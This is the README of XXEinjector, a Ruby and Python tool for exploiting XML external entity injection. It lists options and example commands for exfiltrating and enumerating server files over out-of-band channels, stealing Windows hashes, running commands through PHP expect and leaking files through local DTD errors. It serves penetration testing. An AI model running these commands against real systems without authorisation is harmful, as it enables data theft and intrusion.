## XXEinjector

XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.

Two interchangeable implementations are included: `XXEinjector.rb` (Ruby) and `XXEinjector.py` (Python 3, standard library only). They take the same options, build the same payloads and write the same output.

## Options:<br />
```
  --host	    Mandatory - our IP address for reverse connections. (--host=192.168.0.2)
  --file	    Mandatory - file containing valid HTTP request with xml. You can also mark with "XXEINJECT" a point where DTD should be injected. (--file=/tmp/req.txt)
  --path	    Mandatory if enumerating directories - Path to enumerate. (--path=/etc)
  --brute	    Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)
  --logger	    Log results only. Do not send requests. HTTP logger looks for "p" parameter with results.
  
  --rhost	    Remote host's IP address or domain name. Use this argument only for requests without Host header. (--rhost=192.168.0.3)
  --rport	    Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)

  --oob		    Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)
  --direct	    Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to build a local DTD payload by hand. Use --localdtd for the automated local DTD technique. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)
  --cdata	    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique.
  --2ndfile	    File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)
  --phpfilter	Use PHP filter to base64 encode target file before sending.
  --netdoc      Use netdoc protocol instead of file (Java).
  --enumports	Enumerating unfiltered ports for reverse connection. Specify value "all" to enumerate all TCP ports. (--enumports=21,22,80,443,445)

  --hashes	    Steals Windows hash of the user that runs an application.
  --expect	    Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)
  --upload	    Uploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)
  --xslt	    Tests for XSLT injection.
  --localdtd	    Local DTD technique. Retrieves files in band, from an error message, by repurposing a DTD that is already present on the target. Needs --brute. Use "--localdtd" to try every built-in template, "--localdtd=linux" or "--localdtd=windows" for one OS, "--localdtd=NAME" for a single one and "--localdtd=list" to print them. Each template is tried both in the published shape, which pulls the DTD in with a parameter entity, and in the external subset shape (<!DOCTYPE x SYSTEM "dtd" [ ... ]>) that libxml based parsers need. (--localdtd=docbookx)
  --localdtdfile    File with custom local DTD templates, one per line, in the same format that --localdtd=list prints: name|os|dtd path|entity|value start|tail (--localdtdfile=/tmp/dtds.txt)
  --localdtdsink    Nonexistent path that leaks the file in the error message. (--localdtdsink=file:///nonexistent/)

  --ssl		    Use SSL.
  --proxy	    Proxy to use. (--proxy=127.0.0.1:8080)
  --httpport	Set custom HTTP port. (--httpport=80)
  --ftpport	    Set custom FTP port. (--ftpport=21)
  --gopherport	Set custom gopher port. (--gopherport=70)
  --jarport	    Set custom port for uploading files using jar. (--jarport=1337)
  --xsltport	Set custom port for XSLT injection test. (--xsltport=1337)

  --test	    This mode shows request with injected payload and quits. Used to verify correctness of request without sending it to a server.
  --urlencode	URL encode injected DTD. This is default for URI.
  --nodtd	    If you want to put DTD in request by yourself. Specify "--oob-xml" to show how DTD should look like.
  --output	    Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)
  --timeout	    Timeout for receiving file/directory content. Defaults to 10, or to 1 with --direct and --localdtd, where results come back in the response and there is nothing to wait for. (--timeout=20)
  --contimeout	Timeout for closing connection with server. This is used to prevent DoS condition. (--contimeout=20)
  --fast	    Skip asking what to enumerate. Prone to false-positives.
  --verbose	    Show verbose messages.
```

## Example usage:<br />
```
  Enumerating /etc directory in HTTPS application:
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
  Enumerating /etc directory using gopher for OOB method:
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
  Second order exploitation:
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
  Bruteforcing files using HTTP out of band method and netdoc protocol:
  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
  Enumerating using direct exploitation:
  ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARKSTART,UNIQUEMARKEND
  Enumerating unfiltered ports:
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
  Stealing Windows hashes:
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
  Uploading files using Java jar:
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
  Executing system commands using PHP expect:
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
  Testing for XSLT injection:
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
  Retrieving files through an error message with a local DTD:
  ruby XXEinjector.rb --file=/tmp/req.txt --brute=/tmp/filenames.txt --localdtd --phpfilter
  Local DTD technique with a custom template:
  ruby XXEinjector.rb --file=/tmp/req.txt --brute=/tmp/filenames.txt --localdtd=mydtd --localdtdfile=/tmp/dtds.txt
  Log requests only:
  ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
```

## Request file format

The file passed to `--file` (and `--2ndfile`) is a raw HTTP request, the way a
proxy tool exports it:

```
POST /vulnerable.php HTTP/1.1
Host: 10.0.0.1
Content-Type: application/xml
Content-Length: 46

<?xml version="1.0"?><data><name>x</name></data>
```

Accepted without complaint: CRLF or LF line endings, a UTF-8 BOM, no newline
at the end of the file, a separator line that contains spaces or tabs, a
`Host` header with or without a space after the colon, and header values that
themselves contain `": "`.

The one hard requirement is an **empty line between the headers and the body**.
Without it the headers cannot be told apart from the body, so the tool says
exactly that instead of reporting a format error. Request methods that carry
no body (GET, HEAD, OPTIONS, ...) may end after the headers.

`Host` is read from the header of that name. `--rhost` and `--rport` override
it and are the way to use a request file that has no `Host` header.

The DTD is injected at `XXEINJECT` when that marker is present, otherwise
directly after the `<?xml ... ?>` declaration. If neither is found, the tool
stops and asks for the marker or for `--nodtd`.


**Disclaimer**

This repository contains tool developed strictly for educational purposes. Any misuse of the tool for illegal activities is strictly prohibited.

**Legal Notice**

It is important to understand and comply with all local laws and regulations related to cybersecurity and ethical hacking. Unauthorized access to computer systems, networks, or data is illegal and punishable by law. The developer of this repository is not responsible for any misuse of the tools contained herein.

By using the tools in this repository, you agree to use them responsibly and ethically. Always obtain explicit permission before testing or attempting to access any network, system, or data that does not belong to you.
